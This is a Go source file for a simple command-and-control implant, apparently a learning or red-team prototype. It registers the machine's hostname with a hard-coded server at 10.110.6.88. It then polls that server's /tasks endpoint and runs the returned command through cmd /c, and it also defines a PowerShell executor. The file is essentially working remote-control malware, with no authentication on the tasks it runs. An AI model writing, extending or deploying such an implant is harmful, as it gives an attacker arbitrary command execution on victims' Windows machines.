package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
)

type RegInfo struct {
	DesktopName string
}

type Shell struct {
	Cmd string
}

type Powershell struct {
	Cmd string
}

func execShell(arg string) int {
	c := exec.Command("cmd", "/c", arg)
	if err := c.Run(); err != nil {
		fmt.Println("Error: ", err)
	}

	return 1
}

func execPS(arg string) int {
	c := exec.Command("powershell", arg)
	if err := c.Run(); err != nil {
		fmt.Println("Error: ", err)
	}
	return 1
}

func post(ipaddr string, uri string, structure any) http.Response {
	jsonPayload, err := json.Marshal(structure)
	if err != nil {
		log.Fatalf("Error happened in JSON marshal. Err: %s", err)
	}

	resp, err := http.Post(ipaddr+uri, "application/json", bytes.NewBuffer(jsonPayload))
	if err != nil {
		log.Fatal(err)
	}
	return *resp

}

func getRequest(serverAddr string, uri string) http.Response {
	resp, err := http.Get(serverAddr + uri)
	if err != nil {
		log.Fatal(err)
	}
	return *resp
}

//func getTasks(url string, structure Shell) int {}

const taskuri string = "http://10.110.6.88/tasks"

func main() {
	hostname, error := os.Hostname()
	if error != nil {
		panic(error)
	}

	regInfo := RegInfo{}
	regInfo.DesktopName = hostname

	_ = post("http://10.110.6.88:8080", "/reg", regInfo)

	var shell Shell
	response := getRequest("http://10.110.6.88:8080", "/tasks")
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		log.Fatal(err)
	}
	strBody := string(body)
	if strings.Contains(strBody, "cmd") {
		json.Unmarshal([]byte(body), &shell)
		fmt.Println("execute a cmd prompt")
		//fmt.Println("Argument to execute:", shell.Cmd)
	}
	execShell(shell.Cmd)
}
